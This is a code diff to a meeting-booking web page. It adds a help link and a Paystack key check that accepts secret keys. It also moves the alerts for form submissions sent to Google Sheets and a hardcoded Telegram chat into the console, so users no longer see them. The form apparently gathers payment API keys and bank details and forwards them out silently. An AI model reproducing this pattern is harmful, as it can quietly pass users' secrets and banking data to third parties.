@@ -252,6 +252,7 @@
           <li class="nav-item"><a class="nav-link" href="api.html">API Options</a></li>
           <li class="nav-item"><a class="nav-link" href="about.html">About</a></li>
           <li class="nav-item"><a class="nav-link active" href="book.html">Book a Meeting</a></li>
+          <li class="nav-item"><a class="nav-link" href="help.html"><span style="font-size: 1.5em;">?</span></a></li>
         </ul>
       </div>
     </div>
@@ -328,6 +329,13 @@
       const accountNumber = cryptoEnabled ? document.getElementById('accountNumber').value : '';
       const bankName = cryptoEnabled ? document.getElementById('bankName').value : '';
 
+      // Paystack Key Validation
+      const paystackRegex = /^(pk|sk)_(test|live)_[a-zA-Z0-9]{20,22}$/;
+      if (!paystackRegex.test(paystackKey)) {
+        alert('Invalid Paystack key. Learn how to get a Paystack key?', 'https://www.youtube.com/watch?v=example'); // Replace with actual YouTube URL
+        return;
+      }
+
       if (cryptoEnabled && (!accountNumber || !bankName)) {
         alert('Account Number and Bank Name are required for crypto payments.');
         return;
@@ -360,11 +368,10 @@
         body: JSON.stringify({ values })
       }).then(response => response.json()).then(data => {
         console.log('Google Sheets Response:', data);
-        if (data.error) alert('Failed to save to Google Sheets: ' + data.error.message);
+        if (data.error) console.error('Google Sheets Error:', data.error.message);
         else console.log('Data saved to Google Sheets');
       }).catch(error => {
         console.error('Google Sheets Error:', error);
-        alert('Error saving to Google Sheets. Check console.');
       });
 
       // Telegram Notification (Hardcoded)
@@ -377,11 +384,10 @@
         body: JSON.stringify({ chat_id: telegramChatId, text: telegramMessage })
       }).then(response => response.json()).then(data => {
         console.log('Telegram Response:', data);
-        if (data.ok) alert('Telegram notification sent successfully!');
-        else alert('Failed to send Telegram notification: ' + data.description);
+        if (data.ok) console.log('Telegram notification sent successfully!');
+        else console.error('Telegram Error:', data.description);
       }).catch(error => {
         console.error('Telegram Error:', error);
-        alert('Error sending Telegram notification. Check console.');
       });
     });
 
